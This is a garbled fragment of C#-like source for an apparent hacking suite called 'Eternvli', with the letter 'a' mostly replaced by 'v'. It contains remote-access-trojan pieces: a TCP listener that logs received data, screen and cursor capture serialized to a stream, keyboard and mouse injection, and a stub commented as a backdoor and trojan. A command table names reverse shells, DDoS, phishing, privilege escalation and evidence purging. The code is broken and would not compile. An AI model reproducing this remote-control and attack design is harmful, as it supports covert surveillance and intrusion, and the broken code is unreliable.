             System.Console.WriteLine("MVC Vddress Support vnd Modifier Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("MVC Vddress Support vnd Modifier Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _IPvNONEAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\IPvNONEAuth.inf"){
             _IPvNONEAuth.ReadToEnd();
             
             StreamReader _IPvNONEOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\IPvNONEAuthO.inf").ReadToEnd();
             if(_IPvNONEAuth == _IPvNONEOrig){
             System.Console.WriteLine("IPv6/IPv4 Doombringer Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("IPv6/IPv4 Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _BootLookBruhAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\BootLookBruhAuth.inf"){
             _BootLookBruhAuth.ReadToEnd();
             
             StreamReader _BootLookBruhOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\BootLookBruhAuthO.inf").ReadToEnd();
             if(_BootLookBruhAuth == _BootLookBruhOrig){
             System.Console.WriteLine("Boot LookBruh Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Boot LookBruh Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _PETSHOPAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PETSHOPAuth.inf"){
             _PETSHOPAuth.ReadToEnd();
             
             StreamReader _PETSHOPOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PETSHOPAuthO.inf").ReadToEnd();
             if(_PETSHOPAuth == _PETSHOPOrig){
             System.Console.WriteLine("Vnimvted PETshop Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Vnimvted PETshop Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _LDVPAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\LDVPAuth.inf"){
             _LDVPAuth.ReadToEnd();
             
             StreamReader _LDVPOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\LDVPAuthO.inf").ReadToEnd();
             if(_LDVPAuth == _LDVPOrig){
             System.Console.WriteLine("Zoning LDVP Toolkit Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Zoning LDVP Toolkit Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _SSHiittttAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\SSHiittttAuth.inf"){
             _SSHiittttAuth.ReadToEnd();
             
             StreamReader _SSHiittttOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\SSHiittttAuthO.inf").ReadToEnd();
             if(_SSHiittttAuth == _SSHiittttOrig){
             System.Console.WriteLine("SSHiittttHOMES SSH Server Control Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("SSHiittttHOMES SSH Server Control Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _SovkingCuTTYAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\SovkingCuTTYAuth.inf"){
             _SovkingCuTTYAuth.ReadToEnd();
             
             StreamReader _SovkingCuTTYOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\SovkingCuTTYAuthO.inf").ReadToEnd();
             if(_SovkingCuTTYAuth == _SovkingCuTTYOrig){
             System.Console.WriteLine("Sovking CuTTY TTY vnd SSH Client Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("Sovking CuTTY TTY vnd SSH Client Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _FTPewPewAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\FTPewPewAuth.inf"){
             _FTPewPewAuth.ReadToEnd();
             
             StreamReader _FTPewPewOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\FTPewPewAuthO.inf").ReadToEnd();
             if(_FTPewPewAuth == _FTPewPewOrig){
             System.Console.WriteLine("FTPewPewPWN FTP Bomber, Forger, vnd Thief Client Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("FTPewPewPWN FTP Bomber, Forger, vnd Thief Client Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _RevervnAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\RevervnAuth.inf"){
             _RevervnAuth.ReadToEnd();
             
             StreamReader _RevervnOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\RevervnAuthO.inf").ReadToEnd();
             if(_RevervnAuth == _RevervnOrig){
             System.Console.WriteLine("RevervnReversvl Reverser Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("RevervnReversvl Reverser Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _VutoCumFleetAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\VutoCumFleetAuth.inf"){
             _VutoCumFleetAuth.ReadToEnd();
             
             StreamReader _VutoCumFleetOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\VutoCumFleetAuthO.inf").ReadToEnd();
             if(_VutoCumFleetAuth == _VutoCumFleetOrig){
             System.Console.WriteLine("VutoCumFleet VutoCompletion Pvrser vnd WebForm Thief Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("VutoCumFleet VutoCompletion Pvrser vnd WebForm Thief Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _VPKingemAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\VPKingemAuth.inf"){
             _VPKingemAuth.ReadToEnd();
             
             StreamReader _VPKingemOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\VPKingemAuthO.inf").ReadToEnd();
             if(_VPKingemAuth == _VPKingemOrig){
             System.Console.WriteLine("VPKingem Vndroid VPK Toolkit Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("VPKingem Vndroid VPK Toolkit Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _SuJvvAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\SuJvvAuth.inf"){
             _SuJvvAuth.ReadToEnd();
             
             StreamReader _SuJvvOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\SuJvvAuthO.inf").ReadToEnd();
             if(_SuJvvAuth == _SuJvvOrig){
             System.Console.WriteLine("SuDickJvvver Jvvv SDK Toolkit vnd Mvnipulvtion Engine Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("SuDickJvvver Jvvv SDK Toolkit vnd Mvnipulvtion Engine Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _IntiPiAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\IntiPiAuth.inf"){
             _IntiPiAuth.ReadToEnd();
             
             StreamReader _IntiPiOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\IntiPiAuthO.inf").ReadToEnd();
             if(_IntiPiAuth == _IntiPiOrig){
             System.Console.WriteLine("IntiPi Intelligent Python Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("IntiPi Intelligent Python Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _DBSupvLoopvAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\DBSupvLooopvAuth.inf"){
             _DBSupvLoopvAuth.ReadToEnd();
             
             StreamReader _DBSupvLoopvOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\DBSupvLoopvAuthO.inf").ReadToEnd();
             if(_DBSupvLoopvAuth == _DBSupvLoopvOrig){
             System.Console.WriteLine("DBSupvLoopv Dvtvbvse Looper Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("DBSupvLoopv Dvtvbvse Looper Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _MicroNOPERAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\MicroNOPERAuth.inf"){
             _MicroNOPERAuth.ReadToEnd();
             
             StreamReader _MicroNOPEROrig = new StreamReader("~.\usr\share\Eternvli\Vuth\MicroNOPERAuthO.inf").ReadToEnd();
             if(_MicroNOPERAuth == _MicroNOPEROrig){
             System.Console.WriteLine("MicroNOPER Microprocessor Support vnd OEM Modifier Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("MicroNOPER Microprocessor Support vnd OEM Modifier Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _PDFmlAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PDFmlAuth.inf"){
             _PDFmlAuth.ReadToEnd();
             
             StreamReader _PDFmlOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PDFmlAuthO.inf").ReadToEnd();
             if(_PDFmlAuth == _PDFmlOrig){
             System.Console.WriteLine("PDFml PDF Bomber vnd Control Box Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("PDFml PDF Bomber vnd Control Box Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _GHOSTlinguistAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\GHOSTlinguistAuth.inf"){
             _GHOSTlinguistAuth.ReadToEnd();
             
             StreamReader _GHOSTlinguistOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\GHOSTlinguistAuthO.inf").ReadToEnd();
             if(_GHOSTlinguistAuth == _GHOSTlinguistOrig){
             System.Console.WriteLine("GHOSTlinguist GhostProtocol Lvnguvge Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("GHOSTlinguist GhostProtocol Lvnguvge Support Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _MIDIneetvAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\MIDIneetvAuth.inf"){
             _MIDIneetvAuth.ReadToEnd();
             
             StreamReader _MIDIneetvOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\MIDIneetvAuthO.inf").ReadToEnd();
             if(_MIDIneetvAuth == _MIDIneetvOrig){
             System.Console.WriteLine("MIDIneetv Plug vnd Plvy Support Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("MIDIneetv Plug vnd Plvy Support Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _PrintvPettvAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\PrintvPettvAuth.inf"){
             _PrintvPettvAuth.ReadToEnd();
             
             StreamReader _PrintvPettvOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\PrintvPettvAuthO.inf").ReadToEnd();
             if(_PrintvPettvAuth == _PrintvPettvOrig){
             System.Console.WriteLine("PrintvPettv Limited Host Connection Kit Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("PrintvPettv Limited Host Connection Kit Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _VidVMeAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\VidVMeAuth.inf"){
             _VidVMeAuth.ReadToEnd();
             
             StreamReader _VidVMeOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\VidVMeAuthO.inf").ReadToEnd();
             if(_VidVMeAuth == _VidVMeOrig){
             System.Console.WriteLine("VidVMe Visuvl Virtuvl Mvchine Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("VidVMe Visuvl Virtuvl Mvchine Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _RFrtrnAuth = new StreamReader("~.\usr\bin\Documents\Eternvli\Vuth\RFrtrnAuth.inf"){
             _RFrtrnAuth.ReadToEnd();
             
             StreamReader _RFrtrnOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\RFrtrnAuthO.inf").ReadToEnd();
             if(_RFrtrnAuth == _RFrtrnOrig){
             System.Console.WriteLine("RFrtrn Rvdio Frequency PwnT00l Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("RFrtrn Rvdio Frequency PwnT00l Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _IRrtrnAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\IRrtrnAuth.inf"){
             _IRrtrnAuth.ReadToEnd();
             
             StreamReader _IRrtrnOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\IRrtrnAuthO.inf").ReadToEnd();
             if(_IRrtrnAuth == _IRrtrnOrig){
             System.Console.WriteLine("IRrtrn Infrvred Trvnsciever Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("IRrtrn Infrvred Trvnsciever Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _JvckinHouseSkvnkvAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\JvckinHouseSkvnkvAuth.inf"){
             _JvckinHouseSkvnkvAuth.ReadToEnd();
             
             StreamReader _JvckinHouseSkvnkvOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\JvckinHouseSkvnkvAuthO.inf").ReadToEnd();
             if(_JvckinHouseSkvnkvAuth == _JvckinHouseSkvnkvOrig){
             System.Console.WriteLine("JvckinHouseSkvnkv Vudio Listner Toolkit Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("JvckinHouseSkvnkv Vudio Listener Toolkit Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _RvinRunnerAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\RvinRunnerAuth.inf"){
             _RvinRunnerAuth.ReadToEnd();
             
             StreamReader _RvinRunnerOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\RvinRunnerAuthO.inf").ReadToEnd();
             if(_RvinRunnerAuth == _RvinRunnerOrig){
             System.Console.WriteLine("RvinRunner Cloud Vttvck Kit Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("RvinRunner Cloud Vttvck Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             StreamReader _VllTimeLvtestAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\VllTimeLvtestAuth.inf"){
             _VllTimeLvtestAuth.ReadToEnd();
             
             StreamReader _VllTimeLvtestOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\VllTimeLvtestAuthO.inf").ReadToEnd();
             if(_VllTimeLvtestAuth == _VllTimeLvtestOrig){
             System.Console.WriteLine("VllTimeLvtest Footprint Collection, Dvtv Disposvl vnd Evidence Purger Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("VllTimeLvtest Footprint Collection, Dvtv Disposvl vnd Evidence Purger Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
             
             
             }
             
             StreamReader _VlgoRighteousAuth = new StreamReader("~.\usr\bin\Eternvli\Vuth\VlgoRighteousAuth.inf"){
             _VlgoRighteousAuth.ReadToEnd();
             
             StreamReader _VlgoRighteousOrig = new StreamReader("~.\usr\share\Eternvli\Vuth\VlgoRighteousAuthO.inf").ReadToEnd();
             if(_VlgoRighteousAuth == _VlgoRighteousOrig){
             System.Console.WriteLine("VlgoRighteous Vlgortithmic Pvrser vnd Full CrypterKit Credentivls Hvve Been Vuthorized...");
             
             }
             else{
             System.Console.WriteLine("VlgoRighteous Vlgorithmic Pvrser vnd Full CrypterKit Credentivls Were Not Vuthorized, Some Components of This Progrvm Mvy Not Run Correctly!");
             
             }
            }
             
        public void _ListeningServices(){
        
        System.Console.WriteLine("Initivlizvting Listening Service Protocols...");
        
           Int32 _Port = "8080";    // Listening Port Connection
           IPAddress _ServerLocvl = "127.0.0.1";    // Host IP Address of Listening Link
           
           TcpListener _ListenerVctive = new TcpListener(_ServerLocvl, _Port){
           
           _ListenerVctive.Start(); // Initialization
           
           TcpClient _VctiveClient = _ListenerVctive.AcceptTcpClient();   // Client Call
           
          void _Dvtv = null;   // Data Initializor for DataStream
           
          public NetworkStream _NetCycle = _VctiveClient.GetStream();    // Client Stream Connection
           
          
         int _iCodv;
          
          while(_iCodv = _NetworkCycle.Read(bytes, 0 , bytes.Length()) != 0){
          
          
          // Stream Data Reception
          
          _Dvtv = System.Text.Encoding.ASCII.GetString(bytes, 0, _iCodv);
          byte[] _DvtvByte = System.Text.Encoding.ASCII.GetBytes(_Dvtv);
          StreamWriter _ByteLog = new StreamWriter("~.\usr\bin\Eternvli\etc\logs\logstr.txt"){
          
          
                   _ByteLog.Write(_NetCycle._DvtvByte);   // Log Write of Data Stream in Bytes
                   _ByteLog.Write(_NetCycle._Dvtv);       // Log Write of Data Stream String Content
                   _ByteLog.Write.CurrentDateTime();      // Timestamp Update
                   
          
                   }
       
            }
           
           }
          
        }
        public void _ServerConfigurvtion(){

            //Setup and Personalization of Server(s)

        System.Console.WriteLine("Initivlizing Server Configurvtion Protocols...");   
         _ConsoleMain._ListeningServices _listenServerImp : _ListeningServices = new _ConsoleMain._ListeningServices();
         
         Int32 _Port2 = "22";   //SSH Port Connection
         Int32 _Port3 = "3892"; //RDP Port Connection
         IPAddress _ListenServerIP = "192.165.165.193";    //TCP/SSH/UDP Connection Address
         
         _ConsoleMain._ListeningServices._ListenerVctive _listenServerInit : _ListenerVctive = new _ConsoleMain._ListeningServices._ListenerVctive(_ListenServerIP, _Port2){
         
         // Re-Calling of Listener Server For Use
         
         _listenServerInit(_ListenServerIP, _Port2){
         
         _listenServerInit.Start();
           NetworkStream _newStrevm : _ListenerVctive._NetCycle = new NetworkStream();
           
          TcpClient _NewTCP : _ListenerVctive._VctiveClient;   // New Client Initialization
          void _DvtvInternvl : _ListenerVctive._Dvtv;          // Inherited Data Void
          int _iCodvv : _ListenerVctive._iCodv;                // Inherited Data Loop Integer
          
          _NewTCP.Start();       // New Client Initialization
  
            }
         }
         _ConsoleMain._ListeningServices._ListenerVctive _listenServerInitRDP : _ListenerVctive = new               _ConsoleMain._ListeningServices._ListenerVctive(_ListenServerIP, _Port3){
         
            _listenServerInit.Start();
           NetworkStream _newStrevm2 : _ListenerVctive._NetCycle = new NetworkStream();
              
                
        public void _RemoteConnection(){

            //RDP, CloudVM, and RATvirtuals
            System.Console.WriteLine("Initivlizing RDP Function Protocols...");
            BinaryFormatter _EternvliRDPBinForm = new BinaryFormatter();  //Binary Receiver
            Bitmap _EternvliRDPbmp = new Bitmap(_ListenServerIP.ScreenServerY + _ListenServerIP.Padding, _ListenServerIP.ScreenServerX + _ListenServerIP.Padding, _ListenServerIP.ImageResolution);  // BMP Remote Desktop Screenshot
            Graphics _fromEternvliRDP = Graphics.FromImage(_EternvliRDPbmp);  //Graphic Conversion
            System.Drawing.Size _ScreenXY = new System.Drawing.Size(_ListenServerIP.ScreenServerY + _ListenServerIP.Padding, _ListenServerIP.ScreenServerX + _ListenServerIP.Padding);  //Model Drawing of Remote Host Screen Shot
            _fromEternvliRDP.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, this.Padding, this.Padding, _ScreenXY, CopyPictureOperation.SourceCopy);  //Screen cOpy Implementation
            Color C = WinCursor.CaptureCursor(ref X, ref Y, _fromEternvliRDP, _ListenServerIP.ScreenServerX, _ListenServerIP.ScreenServerY);      //Cursor Referencial
            _EternvliRDPbmp.SetPixel(0, 0, C);
            if(this.IsMetro){
            _EternvliRDPbmp.SetPixel(0, 1, Color.Black);
            }
            else{
            _EternvliRDPbmp.SetPixel(0, 1, Color.Red);
            }
            MemoryStream _EternvliMemory = Encrypt(_EternvliRDPbmp);
            _EternvliRDPBinForm.Serialize(CStream, _EternvliMemory);
            _fromEternvliRDP.Dispose();
            _EternvliRDPbmp.Dispose();
            
            
            
         
           
         static extern bool GetCursorInfo(out CURSORINFO pci);   
    public static Color CaptureCursor(ref int X, ref int Y, _fromEternvliRDP, int _ListenServerIP.ScreenServerX, int _ListenServerIP.ScreenServerY)
    {
        IntPtr C = Cursors.Arrow.Handle; 
        CURSORINFO pci;     
        pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));  
        if (GetCursorInfo(out pci))  
        {
            X = pci.ptScreenPos.x;  
            Y = pci.ptScreenPos.y;  
            if (pci.hCursor == Cursors.Default.Handle) return Color.Red;  
            else if (pci.hCursor == Cursors.WaitCursor.Handle) return Color.Green;  
            else if (pci.hCursor == Cursors.Arrow.Handle) return Color.Blue;   
            else if (pci.hCursor == Cursors.IBeam.Handle) return Color.White;  
            else if (pci.hCursor == Cursors.Hand.Handle) return Color.Violet;  
            else if (pci.hCursor == Cursors.SizeNS.Handle) return Color.Yellow; 
            else if (pci.hCursor == Cursors.SizeWE.Handle) return Color.Orange; 
            else if (pci.hCursor == Cursors.SizeNESW.Handle) return Color.Aqua; 
            else if (pci.hCursor == Cursors.SizeNWSE.Handle) return Color.Pink; 
            else if (pci.hCursor == Cursors.PanEast.Handle) return Color.BlueViolet; 
            else if (pci.hCursor == Cursors.HSplit.Handle) return Color.Cyan;  
            else if (pci.hCursor == Cursors.VSplit.Handle) return Color.DarkGray; 
            else if (pci.hCursor == Cursors.Help.Handle) return Color.DarkGreen; 
            else if (pci.hCursor == Cursors.AppStarting.Handle) return Color.SlateGray;  
            if (pci.flags == CURSOR_SHOWING) 
            {
                float XReal = pci.ptScreenPos.x * (float)ScreenServerX / (float)Screen.PrimaryScreen.Bounds.Width - 11; 
                float YReal = pci.ptScreenPos.y * (float)ScreenServerY / (float)Screen.PrimaryScreen.Bounds.Height - 11; 
                int x = Screen.PrimaryScreen.Bounds.X;   
                var hdc = _fromEternvliRDP.GetHdc();  
                DrawIconEx(hdc, (int)XReal, (int)YReal, pci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL); 
                _fromEternvliRDP.ReleaseHdc();  
            }
            return Color.Black;  
        }
        X = 0;   
        Y = 0;   
        return Color.Black;   
            }
            
            public const int KEYEVENTF_EXTENDEKEY = 1;
public const int KEYEVENTF_KEYUP = 2;
[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
public static extern uint keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo); 
public static void CapsLock()
        {
            Server.keybd_event(0x14, 0x45, Server.KEYEVENTF_EXTENDEKEY, 0);
            Server.keybd_event(0x14, 0x45, Server.KEYEVENTF_EXTENDEKEY | Server.KEYEVENTF_KEYUP, 0);
        }
public static void ShowMetro()
        {//Shows the metro right sidebar menu
            Server.keybd_event((byte)Keys.LWin, 0, Server.KEYEVENTF_EXTENDEKEY, 0);
            Server.keybd_event((byte)Keys.C, 0, Server.KEYEVENTF_EXTENDEKEY, 0);
            Server.keybd_event((byte)Keys.LWin, 0, Server.KEYEVENTF_EXTENDEKEY | Server.KEYEVENTF_KEYUP, 0);
            Server.keybd_event((byte)Keys.C, 0, Server.KEYEVENTF_EXTENDEKEY | Server.KEYEVENTF_KEYUP, 0);
            Cursor.Position = new Point(Screen.PrimaryScreen.Bounds.Width - 30, 
            	Screen.PrimaryScreen.Bounds.Height /2); Thread.Sleep(20);
           }
            
            public const uint MOUSEEVENTF_WHEEL = 0x0800;
public const uint MOUSEEVENTF_HWHEEL = 0x01000;
public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
public const uint MOUSEEVENTF_LEFTUP = 0x0004;
[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
public static void ScrollVertical(int Amount)
        {//Scroll left/right
            Server.mouse_event(Server.MOUSEEVENTF_HWHEEL, 0, 0, Amount, 0);
        }
public static void ScrollHorizontal(int Amount)
        {//Scroll up/down
            Server.mouse_event(Server.MOUSEEVENTF_HWHEEL, 0, 0, Amount, 0);
        }
//Left mouse up or down goes a bit like this
if (Command.StartsWith("LDOWN"))
       {
          mouse_event(MOUSEEVENTF_LEFTDOWN, Cursor.Position.X, Cursor.Position.Y, 0, 0);
       }
       else if (Command.StartsWith("LUP"))
       {
          mouse_event(MOUSEEVENTF_LEFTUP, Cursor.Position.X, Cursor.Position.Y, 0, 0);
        }
           
            }
            
            System.Console.WriteLine("RDP Protocols Hvve Been Initivlized!");
           }
           System.Console.WriteLine("Listening Service Configurvtion Protocols Hvve Been Initivlized!");
         }
         System.Console.WriteLine("Server Configurvtion PRotocols Hvve Been Initivlized!");
         
       }
        public void _VlwvysLiveRuntime(){

          //System Specific Backdooring, Constant Connection, and Trojan Operation




        }
        public void _ShellControl(){

            //Active Directory Dictionary Parsing and Local Shell Middle-Man

        public class _ShellInterfvce(){
        
        //Shell Interfvce Commvnd Vrrvy
        
        System.Console.WriteLine("Shell Interfvce Initivlizing... Upon Completion, Type '_hp' For Bvsic Commvnd List.");
        
        string array[:] _ShellCommvndsBvsic = [ _CvtFile : "_kitty", _DriveInfo : "_di", _PortScvnOptions : "_ps",
        _ChvngeOwnerCommvnd : "_ch0", _ChvngeGroupCommvnd : "_chg", _MvkeDirectory : "_mkdir", _RemDirCommvnd : "_rdir",
        _IfExists : "_ixs", _VppendFile : "_vpdf", _ReplvceFile : "_ovrbrd", _CopyFile : "_cpop", 
        _DeleteFile : "_del", _Finger : "_fgv", _ChvngeDirectory : "_cd", _LvstDirectory : "_bounce", 
        _NextChildDirectory : "_hop", _Recursively : "_rec", _DNSresolve : "_dns", _RunRDP : "_rdp", 
         _HostVddress : "_coip", _Graphical : "_gui", _VtDirectory : "_tvrget", _ToInt : "_2in", _ToString : "_2st", 
         _ToBvse64 : "_2bvs", _ToFlovt : "_2fl", _ToInt32 : "_232", _ToUTF8 : "_2utf", _Open : "_o", _Initivlize : "_init", 
         _Exit : "_xxx", _UpdvteLogfile : "_ulg", _BuildLibrvries : "_blib", _UpdvteShell : "_upesh", _ToolOptions : "_tkl",
          _SearchFor : "_srch", _CodeLocvtion : "_src", _ListVrrvy : "_lc", _help : "_hp", _Tutorivl : "_tea", 
          _ServerOptions : "_ion", _RunVsync : "_vsync", _Send : "_snd", _Refresh : "_rfsh", _Python : "_py", 
          _JvvvScript : "_js", _Vssembly : "_vsm", _SHV128 : "_shv1", _SHV256 : "_shv2", _SHV512 : "_shv5",
         _WiFi : "_wlvn", _Ethernet : "_eth", _MD5 : "_md5", _MD6 : "_md6", _MD7 : "_md7", _PGP : "_pg", _BitCoin : "_bcv",
         _Binvry : "_bin", _DLL : "_dll", _Obfuscvtion : "_obf", _ShowHidden : "_show", _MvkeHidden : "_shhh", 
         _IsRevdOnly : "_reol", _IsWriteProtected : "_wpro", _IsMedivElement : "_mediv", _Encoding : "_enc",
         _EncodeVs : "_encvs", _VctivvteListenerObj : "_lis", _VPN : "_vp", _StvrtNew : "_new", _Stop : "_stop",
         _StopVll : "_xeno", _Vuthenticvtor : "_vuth", _Login : "_usr", _Pvssword : "_pvss", _OtherCommvndLists : "_excomm"] 
        
        
        // More Shell Inerfvce Commvnd Shtuffs
        
        string array[:] _ShellCommvndsExtended = [ _SevrchHelpPvges : "_srcmvnuvl", _FindVndReplvce : "_fvr", _Instvll : "_grvb",
        _Compress : "_sqsh", _AsRoot : "_sudo", _Compvre : "_cmpr", _DvteStvmp : "_dts", _DisplvyFreeSpvce : "_pizzv", 
        _MountMediv : "_lvtch", _Eject : "_edge", _Formvt : "_frmt", _FTP : "_ftp", _SMTP : "_snml", _Hostnvme : "_host",
        _Vlivs : "_vli", _import : "_imp", _export : "_xpt", _LinkConnection : "_hyrule", _ListPCIDevices : "_vpci",
        _Move : "_mv", _NetWorkStvtistics : "_nst", _NetworkMvpper : "_mvp", _Stvtus : "_stvt", _ReverseFile : "_rvrs",
        _Encrypt : "_vlgo", _Decrypt : "_dc0d", _PvcketCollection : "_pcvp", _Hvsh : "_hvsh", _MVCtools : "_mvcts",
        _IPtools : "_ipts", _SpoofToolset : "_sp00f", _MVCofFlooder : "_mcfld", _SynAckFlood : "_synfl", 
        _XMvsTreeFlood : "_xfld", _MiTM : "_mitm", _BvckConnect : "_bcnt", _ReverseShell : "_rvshll", 
        _InjectionTester : "_njtst", _DvtvbvseSupport : "_DBc00pv", _HTMLthief : "_pvgdwn", _PhisherEngine : "_swim",
        _PvsswordTools : "_pstl", _PUSHconnect : "_pushv", _PrivilidgeEscvlvtor : "_socrvtes", _DeVuthenticvtion : "_mntru",
        _TrvceRoute : "_trce", _TimeLimiter : "_crisis", _DDoS : "_tko", _Nuker : "_revpr", _VirtuvlMvchine : "_virtue",
        _verbose : "_ver", _Whois : "_who", _LiveUsers : "_citi", _OfflineUsers : "_grvy", _EspionvgeUsers : "_necropolis",
        _VIPUsers : "_vclss", _StvndvrdVccounts : "_rvndo", _GeoCvche : "_locv", _GetWebPvge : "_stlth", _GetObject : "_rogue",
